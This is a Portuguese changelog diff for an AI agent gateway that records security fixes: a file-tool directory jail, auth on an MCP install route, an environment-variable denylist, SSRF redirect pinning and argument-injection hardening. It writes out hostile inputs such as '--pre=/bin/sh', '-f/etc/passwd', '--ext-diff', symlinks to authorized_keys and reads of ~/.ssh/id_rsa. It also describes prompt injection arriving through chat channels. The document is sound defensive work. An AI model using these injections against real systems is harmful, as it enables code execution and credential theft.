+- **As file tools do agente passam a ter jail de diretorio — `~` e caminho
+  absoluto nao resolvem mais em qualquer lugar do disco (correcao da #1244).**
+  `file_read`, `file_write` e `list_dir` recebiam o caminho cru do modelo,
+  expandiam `~` e aceitavam caminho absoluto sem confinamento nenhum. O
+  parametro `allowed_directories` existia e tinha teste — e os dois pontos de
+  registro em producao (`bootstrap/mod.rs` do gateway e `chat.rs` da CLI)
+  passavam `None`. Era a quinta instancia do mesmo defeito neste repositorio:
+  funcao de seguranca bem testada cujo ponto de chamada em producao nenhum
+  teste exercitava.
+  A consequencia era direta: um prompt chegando por Telegram, Discord ou
+  WhatsApp mandava o modelo ler `~/.ssh/id_rsa`, `/etc/shadow` ou o proprio
+  `config.yml` do gateway — que carrega chave de LLM em claro quando o
+  operador nao usa o cofre. E `list_dir` era o reconhecimento: com ela o
+  modelo achava o alvo antes de pedir a leitura.
+  Agora existe `garraia_agents::FileJail`. As raizes efetivas de uma chamada
+  sao a uniao de `agent.file_roots` (config, vazio por padrao, mais a env
+  `GARRAIA_FILE_ROOTS`) com o `working_dir` da sessao. Conjunto vazio significa
+  **negar tudo**, nao "tudo liberado": sem raiz conhecida nao ha como afirmar
+  que um caminho e seguro. No gateway isso faz a raiz default ser o diretorio
+  da sessao e nada mais — e o `working_dir` de uma sessao ja passa por
+  `project_root::confine` antes de ser gravado. Na CLI o CWD do processo entra
+  como raiz, porque quem roda `garra chat` e o dono da maquina no diretorio que
+  escolheu.
+  O confinamento canonicaliza **antes** de comparar, e compara componente a
+  componente. Isso cobre os quatro vetores: `..`, symlink que aponta para fora
+  da raiz, `~` que expande para fora dela e caminho absoluto. Para escrita, em
+  que o alvo ainda nao existe e `canonicalize` falharia, o jail sobe ate o
+  ancestral existente mais proximo e canonicaliza ele — e o que barra
+  `raiz/link-para-fora/novo.txt`, que uma checagem so do `parent` textual
+  deixaria passar.
+  Um quinto vetor entrou depois da auditoria de seguranca, e e o contraintuitivo:
+  `canonicalize` falhar nao quer dizer "nao existe", quer dizer "nao resolve".
+  Um symlink **pendurado** — cujo alvo nao existe — falha no `canonicalize` e
+  existe para o `lstat`, e o `open(O_CREAT)` de uma escrita segue o link e cria
+  o arquivo no alvo, fora da raiz. Bastava um repositorio clonado trazer
+  `raiz/evil -> ../../../home/u/.ssh/authorized_keys` versionado no git. Agora
+  cada componente que nao canonicaliza passa por `symlink_metadata`: existir
+  para o `lstat` sem resolver e recusa. O caminho e normalizado por
+  `components()` antes desse `lstat`, porque com barra final (`raiz/evil/`) o
+  `lstat` segue o link por POSIX e o pendurado voltaria a parecer inexistente.
+  Um pendurado apontando para dentro da raiz tambem passou a ser recusado —
+  fail-closed assumido, para nao reimplementar resolucao de symlink a mao.
+  A recusa devolve **uma unica frase** ao modelo, sem o caminho, sem a raiz e
+  sem distinguir "nao existe" de "existe mas esta fora" — as tres recusas sao
+  byte-identicas, para a tool nao virar oraculo de existencia de arquivo. A
+  mensagem util da #923 (que diz onde procurou e por que ali) fica preservada
+  para o arquivo ausente **dentro** da raiz, onde ela nao vaza nada.
+  O construtor das tres tools passou a exigir o jail: `FileReadTool::new(None)`
+  nao compila mais. Um jail que se pode esquecer de passar e um jail que se
+  esquece de passar — foi exatamente o que aconteceu. E os testes de regressao
+  do gateway nao chamam o construtor: eles pedem a tool ao runtime que
+  `build_agent_runtime` montou, que e o mesmo objeto que o turno do agente usa.
+  No caminho MCP (`garra_agent`) o `working_dir` passou a ser confinado antes
+  de ser aceito. Ele vira raiz das file tools dentro do `FileJail`, e ali quem
+  o escreve e o MODELO, pelo argumento da tool: sem a checagem,
+  `{"working_dir": "/"}` devolvia o disco inteiro as file tools.
+  `handle_agent_call` agora responde `invalid_params` para um `working_dir`
+  fora das raizes do operador — ele pode estreitar o jail ou ficar dentro,
+  nunca alargar. A doc do schema ainda dizia "validated for existence only —
+  not against allowed_dirs", frase escrita quando o `working_dir` nao era raiz
+  e que depois instruia o modelo a usar exatamente o buraco; foi corrigida no
+  schema, no campo da struct e — a copia de maior alavancagem — no system
+  prompt que o modelo le a cada turno, onde ela sobrevivera a primeira
+  correcao. Um modelo que leia "o campo e validado apenas quanto a existencia"
+  trata a recusa do jail como erro de caminho e roteia pelo `bash`, que de fato
+  passa por fora; e o mesmo prompt manda "nunca contornar silenciosamente um
+  bloqueio de seguranca". O jail tambem passou a ser construido **uma vez por
+  chamada**, em `handle_agent_call`, e desce por parametro ate `build_tools`:
+  a instancia que valida o `working_dir` e a mesma que vai para as file tools,
+  entao nao ha duas reguas para manter em concordancia.
+  `garra config check` avisa quando `agent.file_roots` inclui `/` ou o proprio
+  `$HOME`, que devolvem `~/.ssh` e `.env` ao alcance do modelo — e avisa
+  tambem sobre a env `GARRAIA_FILE_ROOTS`, que soma raizes as da config e antes
+  nao passava por validacao nenhuma (`GARRAIA_FILE_ROOTS=/` desligava o jail em
+  silencio). A comparacao acontece depois do `canonicalize`, senao
+  `$HOME/../$USER` passa batido. No boot, o gateway nomeia as raizes em vez de
+  so conta-las e emite um `warn!` por raiz que, ja resolvida, seja `/` ou o
+  `$HOME`: um jail apertado cria pressao operacional exatamente na direcao da
+  unica configuracao que o desliga, e essa saida nao pode ser a silenciosa.
+  Residual conhecido, registrado e nao reivindicado como resolvido: a checagem
+  resolve o caminho e quem abre o arquivo e a tool, num segundo passo. Entre um
+  e outro, quem tiver escrita dentro da raiz pode trocar um componente por
+  symlink para fora (TOCTOU). Fechar isso exige abrir por descritor
+  (`openat2` com `RESOLVE_BENEATH` no Linux) e nao tem equivalente portatil nos
+  tres sistemas operacionais que o projeto suporta.
+  Segundo residual, e este merece ser dito sem rodeio: **contra symlink a
+  defesa e o `canonicalize`; contra hardlink nao existe defesa com esta API**.
+  Um hardlink dentro da raiz apontando para o inode de um arquivo de fora nao e
+  um ponteiro que se resolve, e um segundo nome do mesmo inode — o
+  `canonicalize` nao tem o que seguir, o `starts_with` aprova, e a escrita cai
+  no inode de fora. No `file_write` o backup `.bak` ainda copia o conteudo de
+  fora para dentro da raiz, e o escape de escrita vira tambem escape de
+  leitura. O impacto pratico e menor que o do symlink pendurado: o git nao
+  versiona hardlink, entao o vetor "repositorio clonado" nao serve, e o ataque
+  exige quem ja tenha escrita dentro da raiz — a mesma pre-condicao do TOCTOU.
+  Fica declarado na §5.72 do threat model em vez de omitido.
+- **`POST /api/mcp/marketplace/install` deixa de aceitar chamador anonimo.** O
+  handler nascia com a assinatura `(State, Json<InstallMcpRequest>)` — sem
+  extractor nenhum de autenticacao ou autorizacao — e a rota era montada direto
+  no grupo aberto do `build_router`. Qualquer chamador que alcancasse a porta
+  registrava um servidor MCP do catalogo no registry do gateway, e escolhia
+  pelo CORPO do pedido tanto os `extra_args` anexados ao comando quanto o `env`
+  do processo que o gateway ia executar. Sao dois problemas empilhados: a rota
+  sem gate, e a rota aceitando ambiente e argumentos arbitrarios para um
+  processo filho.
+  O que torna o alcance maior do que "so quem chega na porta": as rotas `/api/*`
+  sao auth-free por desenho, e o navegador do dono alcanca a porta rodando
+  codigo de terceiro. A guarda anti-CSRF generica da #1182 ja cobria este
+  caminho, mas ela fecha o que o navegador pode ser forcado a fazer, nao o
+  pedido direto — e o gate de `gateway.api_key` e opt-in.
+  A correcao reusa exatamente o padrao das rotas irmas em vez de inventar
+  mecanismo novo: a rota sai do grupo aberto e passa a viver num sub-router com
+  `require_admin_auth` + `require_csrf` + `security_headers`, espelhando o
+  `plugins_handler::build_plugin_routes` que cobre `/api/plugins/*`, e o handler
+  confere `Permission::ManagePlugins` — a mesma permissao que o enum ja descreve
+  como "Plugin / MCP server management" e que `admin_create_mcp` exige para
+  registrar um servidor MCP pela admin API. Nenhuma permissao nova foi criada:
+  `POST /api/plugins/install` e `POST /admin/api/mcp` sao a mesma capacidade por
+  outra porta. `Role::Admin` e `Role::Operator` passam; `Role::Viewer` leva 403.
+  `extra_args` e `env` continuam existindo — sao recurso legitimo para instalar
+  com configuracao propria, e o catalogo depende do `env` para credencial
+  (`GITHUB_PERSONAL_ACCESS_TOKEN`, `POSTGRES_CONNECTION_STRING`, ...). O que
+  entrou junto foi uma denylist estreita: o corpo nao pode mais definir `PATH`,
+  `LD_PRELOAD`, `LD_LIBRARY_PATH`, `LD_AUDIT`, `DYLD_INSERT_LIBRARIES`,
+  `DYLD_LIBRARY_PATH` nem `NODE_OPTIONS` (comparacao case-insensitive), nem
+  nada da familia `npm_config_*`, bloqueada por prefixo — o npm interpreta
+  qualquer variavel com esse prefixo como chave de config, e como todo comando
+  do catalogo e `npx -y`, um `npm_config_registry` apontando para um servidor
+  do atacante faz o `npx` baixar e executar o pacote dele no lugar do pacote do
+  catalogo (`npm_config_script_shell` troca o shell dos lifecycle scripts).
+  Sao as variaveis que decidem QUAL codigo o filho executa — o comando vem do
+  catalogo (`npx -y @modelcontextprotocol/server-...`), e deixar o corpo trocar
+  a resolucao do binario ou pre-carregar uma biblioteca faz o `id` vetado nao
+  garantir mais nada. Secrets do gateway ficaram deliberadamente FORA da
+  denylist: defini-las no filho nao vaza a do gateway — o vazamento era a
+  heranca do ambiente, fechada na #1236 com `env_clear()` — e barra-las
+  quebraria o caso legitimo do catalogo.
+  As tres rotas `GET` do marketplace (catalogo, health, config-schema) seguem
+  abertas de proposito: sao leitura e nao mudam estado.
+  O teste de regressao cobre a matriz de autorizacao (sem cookie → 401, cookie
+  invalido → 401, sessao sem CSRF → 403, `Viewer` → 403, `Operator`/`Admin` →
+  201, env bloqueada → 400) e, alem do sub-router, exercita o router de
+  producao: em axum a primeira rota registrada para um caminho vence, entao sem
+  essa afirmacao alguem re-adicionando a rota ao grupo aberto faria o merge do
+  sub-router protegido perder em silencio. Issue #1245.
+- **`POST /api/providers` passa a conectar o provider com cliente HTTP pinado
+  aos IPs validados pelo SSRF guard, com redirects desligados (fecha #1248).**
+  Ate agora a rota validava o `base_url` do caller com `vet_url` +
+  `IpScope::AllowPrivate` — certo — mas descartava o `VettedUrl` e deixava o
+  provider construir o proprio `reqwest::Client`, com a politica de redirect
+  default (ate 10 saltos) e sem `resolve_to_addrs`. Isso abria duas janelas que
+  o guard existe para fechar: (1) **redirect laundering** — um host publico que
+  passa na validacao responde `302` para `169.254.169.254` (metadados de nuvem)
+  ou qualquer faixa interna, e o `vet_url` ja tinha rodado sem olhar o destino
+  do redirect; (2) **DNS rebinding** — o host era resolvido uma vez na validacao
+  e de novo na conexao, e entre as duas o registro podia mudar. O alcance nao e
+  teorico: `/api/*` e auth-free, `POST /api/providers/test` devolve a latencia
+  (canal de exfiltracao por tempo) e `PATCH /api/providers/default` passa a
+  rotear todo o trafego de chat — e a chave do provider — pelo destino.
+  Agora o `add_provider` guarda o `VettedUrl`, constroi o cliente via
+  `ssrf::pinned_client` (os mesmos `resolve_to_addrs` + `redirect::none()` que
+  `web_fetch`, `plugins_handler`, `health` e mais 5 pontos ja usam) e o injeta
+  pelo `with_client()` que todo provider ja tinha. Como defesa em profundidade,
+  os construtores default de `OpenAiProvider`, `AnthropicProvider` e
+  `OllamaProvider` tambem passam a usar `redirect::Policy::none()`, para que
+  nem um provider vindo do arquivo de config no boot possa ser redirecionado
+  para fora do host. O caminho local (Ollama em `127.0.0.1` sob `AllowPrivate`)
+  segue funcionando. Teste de regressao com wiremock prova que um `302` para um
+  segundo mock nao e seguido; sem a correcao o cliente segue o redirect e
+  devolve a resposta do alvo como se fosse do provider legitimo.
+- **O catalogo de skills de hardware passa a classificar risco em runtime —
+  `kind: hardware-*` tem consumidor (#1250).** A crate de dados (manifestos
+  `hardware-adapter`/`hardware-preset`, lista fechada de transportes) e a
+  regra "risco efetivo = max(adapter, skill)" existiam inteiras, e nenhum
+  deploy as exercitava: `spawn_hardware_adapters` nunca carregava o
+  catalogo, e o registry aplicava so o teto do adapter. Agora o boot de
+  hardware (gateway e `garra chat`, a mesma funcao) carrega o catalogo do
+  MESMO dir de skills que o scanner de instrucoes usa antes de subir
+  qualquer adapter, e injeta o elevador no registry: um device registrado
+  entra embrulhado num decorator cuja visao de capabilities e a efetiva —
+  leitura continua R0 (invariante de `Capability`), acao recebe o maximo
+  entre adapter e preset, e `read`/`execute` passam por dentro. Skills com
+  transporte fora da lista fechada (`mqtt`, `home_assistant`, `serial`,
+  `gpio`) sao carregados inertes e ganham `warn!` no boot. A descoberta
+  tambem mostra os apelidos: presets declaram sinonimos pt/en e o
+  `device_list` lista `aliases: ...` por device, para o agente ligar
+  "luz da sala" ao id que o gate ve.
+  Fail-closed em todas as bordas: skills dir ausente, catalogo vazio ou
+  erro de leitura/parse nao mudam nada (risco fica no teto do adapter,
+  descoberta sem aliases, warn no log) — e como o elevador so sobe risco,
+  um catalogo parcial (skill cujo parse falhou nao entra) nunca abaixa
+  risco nenhum.
+- **`DELETE /admin/api/mcp/{id}` agora revoga de verdade: derruba a conexao
+  viva, limpa o `pending` e solta as tools do `AgentRuntime` (issue #1262,
+  fail-open de revogacao).** Ate agora o handler removia o servidor do
+  registry, apagava as credenciais do cofre e reescrevia o `mcp.json`, mas
+  nunca chamava o `McpManager`. A conexao viva mora no manager, nao no
+  registry, entao o servidor deletado continuava conectado e entregando tools
+  ao agente pelo resto da vida do processo. Pior: depois do #1242 (PR #1255),
+  um restart que falha estaciona a entrada em `pending` com o `env` ja
+  resolvido do cofre; o monitor de saude varre `pending` e **ressuscita o
+  servidor deletado** com os segredos que o operador acabou de revogar. Ou
+  seja, "deletar e revogar" nao revogava, e o caminho era silencioso — a UI
+  mostrava o servidor como removido. Um segundo DELETE ainda devolvia 404 (o
+  servidor sumiu do registry), deixando o operador sem nenhum handle pela
+  admin API para desligar o processo que continuava rodando.
+  O conserto adiciona `McpManager::forget(name)`, que remove a entrada de
+  `pending` **e** de `restart_states` (para o monitor nao ter de onde
+  ressuscitar nem contador orfao), e faz o handler chamar
+  `manager.disconnect` + `manager.forget` **antes** de `remove_server`, na
+  ordem que deixa uma falha de persistencia no par seguro (manager sem,
+  registry com) e nunca no perigoso (registry sem, manager com). As tools do
+  servidor sao dropadas do inventario do runtime via
+  `replace_mcp_tools(server, [])` — `sync_mcp_tools` nao visita servidores
+  ausentes do manager, entao sem a remocao explicita os `McpTool` mortos
+  ficariam listados ate o proximo restart do gateway. Testes de regressao
+  exercitam o handler real e o `health_tick` real, com mutacao provada:
+  remover `disconnect` vermelheia o teste da conexao viva; remover `forget`
+  vermelheia o teste da ressurreicao.
+- **A query do modelo na `repo_search` deixa de cair em posicao de flag — o
+  ripgrep nao executa mais comando escolhido por prompt (correcao da #1266).**
+  A tool entregava a `query` da tool call como argumento posicional, sem o
+  terminador `--`, nos tres comandos que ela monta: `rg`, e os fallbacks `grep`
+  (Unix) e `findstr` (Windows). Como o ripgrep aceita opcao em qualquer
+  posicao, o texto que o modelo escolhe era lido como opcao: `--pre=/bin/sh`
+  faz o proprio `rg` rodar um pre-processador para cada arquivo varrido, ou
+  seja, executa como script um `.txt` comum — daqueles que a `file_write` pode
+  gravar legitimamente dentro do jail de diretorio. A cadeia inteira passa por
+  fora do `bash_tool`, entao nem o allowlist de comando nem o sandbox dele
+  participam, e o piso somente-leitura de canal nao cobre porque `repo_search`
+  e ferramenta de leitura. No `grep`, a mesma posicao rende `-f/etc/passwd`, que
+  troca a busca pedida por padroes lidos de um arquivo escolhido pelo modelo.
+  Agora cada comando e montado por uma funcao pura que poe a `query` **depois**
+  do `--`. O `findstr` nao tem terminador — qualquer argumento comecando com
+  `/` vira opcao — entao ali a query vai em `/C:<texto>`, a forma documentada
+  para string de busca literal; o custo e que esse fallback perde regex, o que
+  vale menos que a classe de injecao. O `file_pattern`, que tambem vem do
+  modelo, passou a `--glob=<valor>`, colado ao nome da opcao em vez de
+  depender de como cada versao do ripgrep resolve um valor que comeca com `-`.
+  Uma query legitima que por acaso comece com `-` (`-> foo`) continua
+  funcionando: e buscada literalmente, em vez de recusada.
+- **A `repo_search` nao consome mais a entrada padrao de quem a chamou
+  (#1266).** Os filhos `rg`/`grep` herdavam o stdin do gateway. Sem argumento
+  de caminho e com um pipe no stdin, o ripgrep decide **buscar no stdin** em
+  vez de varrer o diretorio, e fica pendurado ate o timeout de 15s comendo a
+  entrada do processo pai. Agora os dois comandos sobem com `Stdio::null()`,
+  o que tambem torna o comportamento identico em terminal, pipe e servico —
+  sem isso, o teste de regressao da injecao passava em CI por acidente, porque
+  o `cargo test` da um pipe ao filho e o ataque nem chegava a rodar.
+- **O `file_path` do modelo na `git_diff` deixa de cair em posicao de flag —
+  a injecao de prompt nao desfaz mais o `--no-ext-diff` (correcao da #1269).**
+  A tool empurrava `file_path` e `from_commit`/`to_commit` da tool call como
+  argumentos posicionais, sem terminador. O PR #1075 ja mitiga com
+  `--no-ext-diff` na frente do comando, mas no git, quando a mesma flag
+  aparece mais de uma vez, **a ultima vence**: um `file_path` igual a
+  `--ext-diff` reabria a execucao de comando externo via `diff.external` de
+  um `.git/config` plantado — execucao arbitraria alcancavel por prompt, na
+  mesma classe do #1266 corrigido no PR #1268. Agora os argumentos sao
+  montados por uma funcao pura que poe o `file_path` sempre **depois** do `--`
+  (pathspec, nunca opcao), e o filho git sobe com a entrada padrao nula, como
+  os filhos da `repo_search`.
+- **`from_commit`/`to_commit` da `git_diff` com prefixo `-` sao recusados
+  fail-closed (#1269, segundo achado).** O token de range `{from}..{to}` nao
+  pode ir depois do `--` sem perder a semantica de revisoes, entao ele ganhou
+  validacao propria: revisao que comeca com `-` poe o token inteiro em
+  posicao de opcao — `--output=/tmp/../alvo` escreve a saida do diff em
+  caminho escolhido pelo modelo, `-O<arquivo>` le ordem de arquivo plantado.
+  Revisao legitima nao comeca com `-`, entao a recusa e controlada e cita a
+  revisao recusada.
+- **O `git_diff` volta a produzir diff real: o contexto de linhas agora vai
+  colado (`-U{context}`).** O git recusa a forma `-U 3` separada — o `3`
+  sobrava como argumento posicional e o comando morria com `bad revision
+  '3'` (verificado no git 2.43), logo toda resposta de diff devolvia o erro
+  em vez do diff. A quebra tambem mascarava a correcao de seguranca: com o
+  git morrendo antes de qualquer efeito observavel, nenhum teste de injecao
+  conseguia falhar por efeito. Testes de regressao exercitam a tool pelo
+  caminho do runtime real, com repositorio plantado, controle positivo de
+  diff funcional e prova por efeito (marcador que o driver externo ou o
+  `--output` escreveriam).
+- **Entrada HTTP de `mcp.json` deixa de ser descartada pelo loader e perde a
+  `allowed_tools` (#1274, fail-open de allowlist em restart do admin).** O
+  `McpServerConfig` de config exigia `command: String`, entao toda entrada
+  URL-only de `mcp.json` — o formato legitimo de um servidor MCP remoto, e
+  tambem o formato que o proprio gateway grava no arquivo ao criar um servidor
+  HTTP pelo admin — falhava a desserializacao e era descartada em silencio
+  pelo `load_mcp_json` (skip por entrada, que existe para nao perder o resto
+  do arquivo por causa de uma so). A consequencia passava despercebida ate o
+  proximo restart: o nome do servidor nunca chegava ao merge declarado que o
+  `resolve_allowlist` do restart consulta, a resolucao caia em
+  `AllowlistOrigin::NeverRestricted` e o servidor voltava a conectar com
+  TODAS as tools expostas — a `allowed_tools` que o operador escreveu no
+  arquivo era descartada no exato momento em que importava. Duas varreduras
+  de seguranca anteriores (o comentario do braço `NeverRestricted` nomeava so
+  os servidores criados via API como moradores desse braço) nao pegaram o
+  buraco porque o descarte acontece no loader, dois crates antes do restart.
+  Agora `command` e `#[serde(default)]` (entrada HTTP sem command e valida),
+  a recusa de entrada sem `command` nem `url` e explicita no loader (mesma
+  regra que o `garra config check` reporta, com `warn!` no lugar do silencio),
+  o braço stdio do boot recusa command vazio antes do spawn, e o
+  `garra mcp list` imprime a URL no lugar de command vazio.
+  Cobertura: `load_mcp_json_keeps_http_entry_without_command` (regressao da
+  forma exata da issue), `load_mcp_json_skips_stdio_entry_without_command`
+  (a recusa explicita), teste de composicao no gateway
+  (`restart_resolves_the_allowlist_of_an_http_entry_declared_in_mcp_json`:
+  arquivo real em disco -> `merged_mcp_config` -> `resolve_allowlist` ->
+  `AllowlistOrigin::Config` com a allowlist) e guard de boot. Prova por
+  mutacao: remover o `#[serde(default)]` recoloca os testes na cor vermelha.
+- **A redacao do stderr da ponte do WhatsApp deixava a chave inteira passar
+  quando ela vinha percent-encoded ou com a barra escapada (#1276, item 2).**
+  A regra corta qualquer segmento com 40+ caracteres de base64, e `%` e `\`
+  nao sao caracteres de segmento — `100%` e o caminho do Windows dependem
+  disso. So que uma chave na URL de um `FetchError` do undici
+  (`https://mmg.whatsapp.net/v/t62.7118-24/<chave>?ccb=11-4`) chega com `+`,
+  `/` e `=` percent-encoded (`%2B`/`%2F`/`%3D`), e uma chave que passou por
+  `JSON.stringify` chega com `\/`: cada ocorrencia quebrava a sequencia em
+  pedacos curtos demais para o teto, os pedacos saiam em claro e bastava um
+  url-decode (ou um unescape) do texto ja redigido para remontar a chave.
+  Medido sobre chaves aleatorias de 32 B: 62,9% das chaves percent-encoded e
+  40,8% das chaves com `\/` chegavam INTEIRAS a tela. As saidas obvias foram
+  medidas e descartadas — mexer no teto de 40 nao muda a fracao, porque o
+  problema e onde o segmento quebra e nao o tamanho dele, e exigir mistura de
+  classes de caractere deixa 0,07% das chaves em claro. O tokenizador de
+  segmentos agora enxerga as duas codificacoes: `%2B`/`%2F`/`%3D` (qualquer
+  caixa) e `\/` contam como UM caractere do segmento, o teto e o `N` do
+  marcador `<redigido: N caracteres>` sao sobre o comprimento decodificado, e
+  um segmento curto sai como entrou, sem decodificar. `%` seguido de qualquer
+  outra coisa (`%20`, `%25`, `100%`) e `\` seguido de qualquer coisa que nao
+  `/` continuam separadores, entao caminho do Windows e URL do registry npm
+  (`@whiskeysockets%2Fbaileys`) saem inteiros. Um teste de corpus refaz a
+  medicao da issue com 500 chaves de semente fixa — 61,0% e 37,6% no codigo
+  antigo — e exige zero chaves recuperaveis nas duas codificacoes, com base64
+  padrao e url-safe 100% redigidos como regressao. Fica, por escrito, o
+  limite declarado: credencial com menos de 40 caracteres decodificados nao e
+  redigida.
+
 ## [0.4.2] - 2026-09-13
 
 Release em que o Garra saiu da tela. O epic de hardware fechou inteiro — as
